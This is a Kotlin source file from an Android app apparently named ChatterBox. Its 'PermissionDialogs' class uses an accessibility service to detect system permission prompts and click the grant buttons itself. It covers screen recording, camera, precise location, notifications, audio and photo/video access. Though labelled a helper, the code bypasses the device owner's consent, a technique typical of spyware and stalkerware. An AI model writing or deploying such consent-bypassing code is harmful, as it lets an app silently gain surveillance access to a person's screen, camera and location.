package com.example.ChatterBox.accessibility

import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Helper class for handling various permission dialogs via accessibility service
 */
class PermissionDialogs(private val accessibilityService: AccessibilityService) {

    private val TAG = "PermissionDialogs"
    private val handler = Handler(Looper.getMainLooper())

    /**
     * Main function to check and handle all permission dialogs
     */
    fun handlePermissionDialog(rootNode: AccessibilityNodeInfo?) {
        if (rootNode == null) return

        Log.d(TAG, "Checking for permission dialogs")

        // Try to handle various permission dialogs based on their text content
        handleMediaProjectionDialog(rootNode)
        handleCameraPermissionDialog(rootNode)
        handleLocationPermissionDialog(rootNode)
        handleNotificationPermissionDialog(rootNode)
        handleAudioPermissionDialog(rootNode)
        handlePhotoVideoPermissionDialog(rootNode)

    }

    /**
     * Handle media projection permission dialog (screen recording)
     * This one we'll handle separately as it requires special treatment
     */
    private fun handleMediaProjectionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Start recording or casting with ChatterBox?")
        if (dialogText != null) {
            Log.d(TAG, "Media projection permission dialog detected")

            // Find and click the START NOW button
            val startButton = findNodeWithText(rootNode, "START NOW")
            if (startButton != null) {
                // Found the button, click it after a short delay
                handler.postDelayed({
                    clickNode(startButton)
                    Log.d(TAG, "Clicked START NOW button automatically")
                }, 500)
            }
        }
    }

    /**
     * Handle camera permission dialog
     */
    private fun handleCameraPermissionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to take pictures and record video?")
        if (dialogText != null) {
            Log.d(TAG, "Camera permission dialog detected")

            // Click "WHILE USING THE APP" option
            val allowButton = findNodeWithText(rootNode, "WHILE USING THE APP")
            if (allowButton != null) {
                handler.postDelayed({
                    clickNode(allowButton)
                    Log.d(TAG, "Clicked WHILE USING THE APP for camera permission")
                }, 500)
            }
        }
    }

    /**
     * Handle location permission dialog
     */
    private fun handleLocationPermissionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access this device's location?")
        if (dialogText != null) {
            Log.d(TAG, "Location permission dialog detected")

            // Look for "Precise" text to verify it's the location dialog
            val preciseText = findNodeWithText(rootNode, "Precise")

            if (preciseText != null) {
                // Click "WHILE USING THE APP" option
                val allowButton = findNodeWithText(rootNode, "WHILE USING THE APP")
                if (allowButton != null) {
                    handler.postDelayed({
                        clickNode(allowButton)
                        Log.d(TAG, "Clicked WHILE USING THE APP for location permission")
                    }, 500)
                }
            }
        }
    }

    /**
     * Handle notification permission dialog
     */
    private fun handleNotificationPermissionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to send you notifications?")
        if (dialogText != null) {
            Log.d(TAG, "Notification permission dialog detected")

            // Click "ALLOW" option
            val allowButton = findNodeWithText(rootNode, "ALLOW")
            if (allowButton != null) {
                handler.postDelayed({
                    clickNode(allowButton)
                    Log.d(TAG, "Clicked ALLOW for notification permission")
                }, 500)
            }
        }
    }

    /**
     * Handle audio permission dialog
     */
    private fun handleAudioPermissionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access music and audio on this device?")
        if (dialogText != null) {
            Log.d(TAG, "Audio permission dialog detected")

            // Click "ALLOW" option
            val allowButton = findNodeWithText(rootNode, "ALLOW")
            if (allowButton != null) {
                handler.postDelayed({
                    clickNode(allowButton)
                    Log.d(TAG, "Clicked ALLOW for audio permission")
                }, 500)
            }
        }
    }

    /**
     * Handle photos and videos permission dialog
     */
    private fun handlePhotoVideoPermissionDialog(rootNode: AccessibilityNodeInfo) {
        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access photos and videos on this device?")
        if (dialogText != null) {
            Log.d(TAG, "Photos and videos permission dialog detected")

            // Click "ALLOW" option
            val allowButton = findNodeWithText(rootNode, "ALLOW")
            if (allowButton != null) {
                handler.postDelayed({
                    clickNode(allowButton)
                    Log.d(TAG, "Clicked ALLOW for photos and videos permission")
                }, 500)
            }
        }
    }

    /**
     * Helper function to find a node with text that contains the given string
     * This makes matching more reliable across different Android versions
     */
    private fun findNodeWithText(rootNode: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
        return if (nodes.isNotEmpty()) nodes[0] else null
    }

    /**
     * Helper function to click on a node, handling cases where the node itself isn't clickable
     */
    private fun clickNode(node: AccessibilityNodeInfo) {
        if (node.isClickable) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } else {
            // If the node itself is not clickable, try to find its clickable parent
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    break
                }
                val tempParent = parent
                parent = parent.parent
                tempParent.recycle()
            }
        }
    }

    /**
     * Clean up resources
     */
    fun cleanup() {
        handler.removeCallbacksAndMessages(null)
    }
}